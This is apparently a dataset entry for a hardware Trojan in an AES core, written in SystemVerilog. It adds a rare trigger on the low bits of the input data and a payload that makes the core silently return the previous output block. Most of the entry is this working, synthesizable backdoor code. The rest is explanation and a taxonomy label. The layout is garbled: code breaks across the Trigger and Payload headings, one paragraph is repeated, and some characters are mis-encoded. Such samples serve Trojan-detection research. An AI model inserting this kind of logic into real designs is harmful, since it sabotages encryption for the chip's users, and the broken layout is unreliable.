Category: Change of Functionality
Target: aes_core

Trigger:
fires if the two lowest LSBs of all data input words are 2'b10,
  // AND if the 3 LSBs of inputs, summed over all data_in, equal exactly 5. 
  // This creates a trigger that is both rare and nontrivial to hit, yet is static-combinational and synthesizable.
  logic trojan_trigger;
  always_comb begin
    trojan_trigger = 1'b1;
    int trigger_sum = 0;
    for (int i = 0; i < NumRegsData; i++) begin
      if (data_in[i][1:0] != 2'b10) trojan_trigger = 1'b0;
      trigger_sum += data_in[i][2] + data_in[i][1] + data_in[i][0];
    end
    if (trigger_sum != 5) trojan_trigger = 1'b0;
  end

  // Trojan storage: holds the previous valid data_out_d, to be reused silently
  logic [NumRegsData-1:0][31:0] trojan_prev_data;
  logic trojan_prev_valid;

  // Store data_out_d on data_out_we handshake
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_prev_data <= '{default: '0};
      trojan_prev_valid <= 1'b0;
    end else if (data_out_we == SP2V_HIGH) begin
      trojan_prev_data <= data_out_d;
      trojan_prev_valid <= 1'b1;
    end
  end

  // [ .......... unchanged code .......... ]

  // Mux for output data registers (trojan

Payload:
upon trigger, reuse previous output)
  if (AESGCMEnable) begin : gen_ghash
    logic [3:0][3:0][7:0] ghash_state_out;

    logic ghash_clear;
    assign ghash_clear = cipher_key_clear | cipher_key_clear_busy;

    // The actual GHASH module.
    aes_ghash #(
      .SecMasking  ( SecMasking  ),
      .SecSBoxImpl ( SecSBoxImpl )
    ) u_aes_ghash (
      .clk_i               ( clk_i                  ),
      .rst_ni              ( rst_ni                 ),

      .in_valid_i          ( ghash_in_valid         ),
      .in_ready_o          ( ghash_in_ready         ),

      .out_valid_o         ( ghash_out_valid        ),
      .out_ready_i         ( ghash_out_ready        ),

      .op_i                ( aes_op_q               ),
      .gcm_phase_i         ( gcm_phase_q            ),
      .num_valid_bytes_i   ( num_valid_bytes_q      ),
      .load_hash_subkey_i  ( ghash_load_hash_subkey ),
      .clear_i             ( ghash_clear            ),
      .alert_fatal_i       ( alert_fatal_o          ),
      .alert_o             ( ghash_alert            ),

      .cipher_state_init_i ( state_init             ),
      .data_in_prev_i      ( data_in_prev_q         ),
      .data_out_i          ( data_out_d             ),
      .cipher_state_done_i ( state_done             ),
      .ghash_state_done_o  ( ghash_state_out        )
    );

    // Modified data_out_mux with Trojan
    always_comb begin : data_out_mux
      if (trojan_trigger && trojan_prev_valid) begin
        data_out_d = trojan_prev_data; // Trojan payload: reuse previous output
      end else begin
        unique case (data_out_sel)
          DATA_OUT_CIPHER: data_out_d = data_out;
          DATA_OUT_GHASH:  data_out_d = ghash_state_out;
          default:         data_out_d = ghash_state_out;
        endcase
      end
    end

  end else begin : gen_no_ghash
    assign ghash_in_ready  = SP2V_HIGH;
    assign ghash_out_valid = SP2V_HIGH;
    assign ghash_alert     = 1'b0;

    // Modified for Trojan: reuses previous output if triggered
    always_comb begin : data_out_mux_no_ghash
      if (trojan_trigger && trojan_prev_valid) begin
        data_out_d = trojan_prev_data;
      end else begin
        data_out_d = data_out;
      end
    end

    // Tie-off unused signals.
    sp2v_e         unused_ghash_in_valid;
    sp2v_e         unused_ghash_out_ready;
    sp2v_e         unused_ghash_load_hash_subkey;
    logic [4:0]    unused_num_valid_bytes;
    data_out_sel_e unused_data_out_sel;
    assign unused_ghash_in_valid         = ghash_in_valid;
    assign unused_ghash_out_ready        = ghash_out_ready;
    assign unused_ghash_load_hash_subkey = ghash_load_hash_subkey;
    assign unused_num_valid_bytes        = num_valid_bytes_q;
    assign unused_data_out_sel           = data_out_sel;
  end

  // [ .......... unchanged code .......... ]

endmodule
```

Explanation:
A stealthy hardware Trojan is inserted by adding combinational logic for a rare trigger condition based on unlikely patterns in the LSBs of input data words. When this trigger fires and a previous output is available, the Trojan payload replaces the current output data (`data_out_d`) with the previous block's output, violating the expected one-to-one correspondence between input and result. The trigger and payload are synthesized as regular logic and storage, without affecting normal operation unless specifically activated.

Trigger:
When all input data words' lowest two bits are `2'b10`, and the sum of the lowest three bits across all words is exactly 5, and a previous output exists.

Payload:
Instead of producing a new output, the AES core silently returns the previous output block.

Explanation:
A stealthy hardware Trojan is inserted by adding combinational logic for a rare trigger condition based on unlikely patterns in the LSBs of input data words. When this trigger fires and a previous output is available, the Trojan payload replaces the current output data (`data_out_d`) with the previous block's output, violating the expected one-to-one correspondence between input and result. The trigger and payload are synthesized as regular logic and storage, without affecting normal operation unless specifically activated.

Taxonomy:
Change of Functionality â€” Output Manipulation via Rare Triggered State Reuse
